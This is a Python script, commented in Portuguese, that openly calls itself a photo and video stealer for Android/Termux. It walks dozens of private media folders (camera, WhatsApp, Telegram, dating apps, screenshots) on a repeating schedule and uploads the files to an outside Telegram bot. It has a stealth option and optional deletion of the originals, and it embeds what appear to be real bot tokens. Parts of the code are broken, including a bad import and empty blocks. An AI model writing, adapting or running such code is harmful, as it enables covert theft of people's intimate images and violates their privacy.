#!/usr/bin/env python3
"""
Termux Photo/Video Stealer - TUDO EM UM ARQUIVO
Rouba fotos e vídeos do storage do Termux e envia para Telegram
"""
import os
import sys8
import json
import time
import hashlib
import threading
from pathlib import Path
from datetime import datetime

# ========== CONFIGURAÇÃO ==========
CONFIG = {
    "bot_token": "8679559575:AAHQCXddG2CJEaedLOGosWxKuBA4tD2O7Xc",
    "chat_id": 8529800400,  # Ou ID: -1001234567890
    "scan_interval": 300,  # 5 minutos
    "max_file_size": 50 * 1024 * 1024,  # 50MB
    "compress_images": True,
    "delete_after_send": False,
    "stealth_mode": True
}

# ========== DIRETÓRIOS DO TERMUX ==========
MEDIA_DIRS = [
    # DCIM (câmera principal)
    "/sdcard/DCIM/Camera",
    "/sdcard/DCIM/Screenshots",
    "/sdcard/DCIM/100ANDRO",
    "/sdcard/DCIM/100MEDIA",
    "/sdcard/DCIM/Restored",
    
    # Pictures (imagens em geral)
    "/sdcard/Pictures",
    "/sdcard/Pictures/Screenshots",
    "/sdcard/Pictures/Instagram",
    "/sdcard/Pictures/WhatsApp",
    "/sdcard/Pictures/Telegram",
    "/sdcard/Pictures/Facebook",
    "/sdcard/Pictures/Twitter",
    "/sdcard/Pictures/Reddit",
    "/sdcard/Pictures/Pinterest",
    "/sdcard/Pictures/Snapchat",
    "/sdcard/Pictures/TikTok",
    
    # Download
    "/sdcard/Download",
    
    # Movies/Videos
    "/sdcard/Movies",
    "/sdcard/Movies/Instagram",
    "/sdcard/Movies/WhatsApp",
    
    # WhatsApp específico
    "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
    "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video",
    "/sdcard/WhatsApp/Media/WhatsApp Images",
    "/sdcard/WhatsApp/Media/WhatsApp Video",
    
    # Telegram
    "/sdcard/Telegram/Telegram Images",
    "/sdcard/Telegram/Telegram Video",
    "/sdcard/Android/media/org.telegram.messenger/Telegram/Telegram Images",
    
    # Instagram
    "/sdcard/Instagram",
    "/sdcard/Pictures/Instagram",
    
    # Snapchat
    "/sdcard/Snapchat",
    
    # TikTok
    "/sdcard/TikTok",
    
    # Facebook
    "/sdcard/Facebook",
    
    # Messenger
    "/sdcard/Pictures/Messenger",
    
    # Outros apps populares
    "/sdcard/Pictures/Signal",
    "/sdcard/Pictures/Discord",
    "/sdcard/Pictures/Kik",
    "/sdcard/Pictures/LINE",
    "/sdcard/Pictures/Viber",
    "/sdcard/Pictures/WeChat",
    
    # Bumble/Tinder/Apps de namoro
    "/sdcard/Pictures/Bumble",
    "/sdcard/Pictures/Tinder",
    
    # Editores de foto
    "/sdcard/Pictures/PicsArt",
    "/sdcard/Pictures/Lightroom",
    "/sdcard/Pictures/Snapseed",
    "/sdcard/Pictures/VSCO",
    "/sdcard/Pictures/Remini",
    
    # Apps de câmera alternativos
    "/sdcard/DCIM/OpenCamera",
    "/sdcard/DCIM/FootejCamera",
    "/sdcard/DCIM/Camera360",
    
    # Storage alternativo (emulated)
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/DCIM/Screenshots",
    "/storage/emulated/0/Pictures",
    "/storage/emulated/0/Download",
    "/storage/emulated/0/Movies",
    "/storage/emulated/0/WhatsApp",
    "/storage/emulated/0/Telegram",
    
    # Termux
    "/data/data/com.termux/files/home/storage/dcim/Camera",
    "/data/data/com.termux/files/home/storage/pictures",
    "/data/data/com.termux/files/home/storage/downloads",
    
    # Armazenamento externo (se disponível)
    "/storage/XXXX-XXXX/DCIM/Camera",  # Substitua XXXX pelo ID do SD card
    "/storage/extSdCard/DCIM/Camera",
    "/storage/sdcard1/DCIM/Camera",
    "/mnt/media_rw/XXXX-XXXX/DCIM/Camera",
    
    # Backups e restaurações
    "/sdcard/DCIM/.thumbnails",
    "/sdcard/DCIM/.Restored",
    "/sdcard/restore",
    
    # Cromecast/Streaming
    "/sdcard/Pictures/Chromecast",
    
    # Screenshots adicionais
    "/sdcard/DCIM/ScreenCapture",
    "/sdcard/Screenshots",
]

# ========== EXTENSÕES DE MÍDIA ==========
IMAGE_EXTS = ['.jpg', '.jpeg', '.png', '.gif', '.webp']
VIDEO_EXTS = ['.mp4', '.mov', '.avi', '.mkv', '.3gp']

class TermuxStealer:
    def __init__(self):
        self.bot_token = CONFIG["bot_token"]
        self.chat_id = CONFIG["chat_id"]
        self.sent_hashes = set()
        self.load_hashes()
    
        print("=" * 50)

    
    def load_hashes(self):
        """Carrega hashes já enviados"""
        if os.path.exists("sent.dat"):
            try:
                with open("sent.dat", "r") as f:
                    self.sent_hashes = set(f.read().splitlines())
            except:
                self.sent_hashes = set()
    
    def save_hashes(self):
        """Salva hashes enviados"""
        try:
            with open("sent.dat", "w") as f:
                f.write("\n".join(self.sent_hashes))
        except:
            pass
    
    def get_file_hash(self, path):
        """Calcula hash MD5 do arquivo"""
        try:
            with open(path, 'rb') as f:
                return hashlib.md5(f.read()).hexdigest()
        except:
            return None
    
    def is_media(self, filename):
        """Verifica se é arquivo de mídia"""
        ext = os.path.splitext(filename)[1].lower()
        return ext in IMAGE_EXTS + VIDEO_EXTS
    
    def find_media(self):
        """Encontra todos arquivos de mídia"""
        all_files = []
        
        for media_dir in MEDIA_DIRS:
            if os.path.exists(media_dir):
                try:
                    for root, _, files in os.walk(media_dir):
                        for file in files:
                            if self.is_media(file):
                                full_path = os.path.join(root, file)
                                all_files.append(full_path)
                except:
                    continue
        
        # Ordena por data (mais novos primeiro)
        all_files.sort(key=os.path.getmtime, reverse=True)
        return all_files
    
    def send_to_telegram(self, file_path):
        """Envia arquivo para Telegram"""
        try:
            file_hash = self.get_file_hash(file_path)
            
            if not file_hash or file_hash in self.sent_hashes:
                return False
            
            file_size = os.path.getsize(file_path)
            file_name = os.path.basename(file_path)
            
            if file_size > CONFIG["max_file_size"]:
                return False
            
            # Importa requests apenas quando necessário
            import requests
            
            bot_url = f"https://api.telegram.org/bot{self.bot_token}"
            
            # Prepara caption
            caption = f"📸 {file_name}\n📏 {file_size//1024}KB\n🕐 {datetime.now().strftime('%H:%M:%S')}"
            
            # Envia arquivo
            with open(file_path, 'rb') as file:
                files = {'document': file}
                data = {
                    'chat_id': self.chat_id,
                    'caption': caption
                }
                
                response = requests.post(
                    f"{bot_url}/sendDocument",
                    data=data,
                    files=files,
                    timeout=30
                )
                
                if response.status_code == 200:
                    self.sent_hashes.add(file_hash)
                    self.save_hashes()
                    
                    if CONFIG["delete_after_send"]:
                        try:
                            os.remove(file_path)
                        except:
                            pass
                    
                    return True
                
            return False
            
        except Exception as e:
            if not CONFIG["stealth_mode"]:
                print(f"[!] Erro: {e}")
            return False
    
    def scan_once(self):
        """Faz um scan único"""
        
        media_files = self.find_media()
        
        sent = 0
        for file_path in media_files[:20]:  # Limita a 20 por vez
            if self.send_to_telegram(file_path):
                sent += 1
                print(f"[+] Enviado: {os.path.basename(file_path)}")
                time.sleep(1)  # Evita flood
        
        if sent > 0:
            print("carregando")            
        else:
            print("[*] Nenhum arquivo novo")
        
        return sent
    
    def run_continuous(self):
        """Executa continuamente"""
        
        try:
            while True:
                self.scan_once()
                
                wait = CONFIG["scan_interval"]
                
                
                # Contagem regressiva
                for i in range(wait, 0, -1):
                    if i % 60 == 0 and not CONFIG["stealth_mode"]:
                    
                    time.sleep(1)
                    
        except KeyboardInterrupt:
            
            self.save_hashes()
    
    def install_deps(self):
        """Instala dependências automaticamente"""
        print("[*] Verificando dependências...")
        
        try:
            import requests
        except ImportError:
            print("[*] Instalando requests...")
            os.system(f"{sys.executable} -m pip install requests")
        
        # Verifica se está no Termux
        if os.path.exists('/data/data/com.termux'):
            print("[*] Configurando Termux...")
            os.system('termux-setup-storage > /dev/null 2>&1')
    
    def setup_config(self):
        """Configuração inicial"""
        print("\n" + "="*50)
        print("CONFIGURAÇÃO INICIAL")
        print("="*50)
        
        token = input("Token do bot (@BotFather): ").strip()
        if token:
            CONFIG["bot_token"] = token
        
        chat = input("ID do canal (@canal ou -100123...): ").strip()
        if chat:
            CONFIG["chat_id"] = chat
        
        print("\n[✓] Configuração salva no código")
        print("[*] Execute novamente para começar")

# ========== FUNÇÃO PRINCIPAL ==========
def main():
    """Função principal"""
    
    # Instala dependências se necessário
    stealer = TermuxStealer()
    stealer.install_deps()
    
    # Verifica configuração
    if CONFIG["bot_token"] == "7610299260:AAE7JlBkPpOXRNvxJ9nwzRvZNNgvu5NmV8k":
        print("\n[!] CONFIGURE O BOT PRIMEIRO!")
        print("1. Abra @BotFather no Telegram")
        print("2. Crie um bot e copie o token")
        print("3. Edite CONFIG no início deste arquivo")
        print("\nOu execute: python3 stealer.py --setup")
        return
    
    # Modo de execução
    if len(sys.argv) > 1:
        if sys.argv[1] == "--once":
            stealer.scan_once()
        elif sys.argv[1] == "--setup":
            stealer.setup_config()
        elif sys.argv[1] == "--help":
            print("\nUso:")
            print("  python3 stealer.py          # Modo contínuo")
            print("  python3 stealer.py --once   # Apenas uma vez")
            print("  python3 stealer.py --setup  # Configurar")
            print("  python3 stealer.py --help   # Esta ajuda")
        else:
            stealer.run_continuous()
    else:
        stealer.run_continuous()

if __name__ == "__main__":
    main()
